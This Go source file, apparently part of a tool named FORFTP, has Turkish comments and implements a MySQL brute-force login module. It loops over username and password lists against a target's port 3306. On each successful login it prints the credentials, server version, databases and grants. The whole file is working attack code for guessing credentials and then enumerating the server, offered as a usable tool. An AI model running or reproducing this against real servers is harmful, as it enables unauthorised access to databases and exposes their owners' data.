package mysqlscan

import (
	"database/sql"
	"fmt"
	"strings"
	"time"

	"FORFTP/utils"

	_ "github.com/go-sql-driver/mysql"
)

type MySQLResult struct {
	Target     string
	Version    string
	User       string
	Databases  []string
	Privileges []string
	Error      string
}

// ScanMySQL: Detaylı MySQL taraması
func ScanMySQL(target, user, pass string, timeout time.Duration) MySQLResult {
	dsn := fmt.Sprintf("%s:%s@tcp(%s:3306)/", user, pass, target)
	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return MySQLResult{Target: target, Error: err.Error()}
	}
	defer db.Close()

	db.SetConnMaxLifetime(timeout)
	db.SetConnMaxIdleTime(timeout)
	db.SetMaxOpenConns(1)
	db.SetMaxIdleConns(1)

	if err := db.Ping(); err != nil {
		return MySQLResult{Target: target, Error: err.Error()}
	}

	result := MySQLResult{Target: target, User: user}

	// Versiyon bilgisi
	var version string
	if err := db.QueryRow("SELECT VERSION()").Scan(&version); err != nil {
		result.Error = "Versiyon alınamadı: " + err.Error()
	} else {
		result.Version = version
	}

	// Kullanıcı yetkileri
	rows, err := db.Query("SHOW GRANTS FOR CURRENT_USER()")
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var grant string
			if err := rows.Scan(&grant); err == nil {
				result.Privileges = append(result.Privileges, grant)
			}
		}
	}

	// Veritabanları
	dbs, err := db.Query("SHOW DATABASES")
	if err == nil {
		defer dbs.Close()
		for dbs.Next() {
			var dbName string
			if err := dbs.Scan(&dbName); err == nil {
				result.Databases = append(result.Databases, dbName)
			}
		}
	}

	return result
}

// BruteForceMySQL: Basit brute force, başarılı girişleri detaylı gösterir
func BruteForceMySQL(target string, users, passwords []string, timeout time.Duration) []MySQLResult {
	var successes []MySQLResult
	fmt.Println(utils.Colorize("[*] MySQL brute force başlatılıyor: "+target, utils.ColorYellow))

	for _, user := range users {
		for _, pass := range passwords {
			dsn := fmt.Sprintf("%s:%s@tcp(%s:3306)/", user, pass, target)
			db, err := sql.Open("mysql", dsn)
			if err != nil {
				continue
			}

			db.SetConnMaxLifetime(timeout)
			db.SetConnMaxIdleTime(timeout)
			db.SetMaxOpenConns(1)
			db.SetMaxIdleConns(1)

			if err := db.Ping(); err == nil {
				result := ScanMySQL(target, user, pass, timeout)
				successes = append(successes, result)

				fmt.Println("======================================")
				fmt.Printf("%s %s\n", utils.Colorize("Başarılı giriş:", utils.ColorGreen), utils.Colorize(fmt.Sprintf("%s:%s", user, pass), utils.ColorCyan))
				fmt.Printf("%s %s\n", utils.Colorize("Versiyon:", utils.ColorYellow), utils.Colorize(result.Version, utils.ColorWhite))
				fmt.Printf("%s %d veritabanı: %s\n", utils.Colorize("Veritabanları:", utils.ColorYellow), len(result.Databases), strings.Join(result.Databases, ", "))
				fmt.Println("Yetkiler:")
				for _, p := range result.Privileges {
					fmt.Printf(" - %s\n", utils.Colorize(p, utils.ColorWhite))
				}
				fmt.Println("======================================")
			}
			db.Close()
		}
	}

	return successes
}
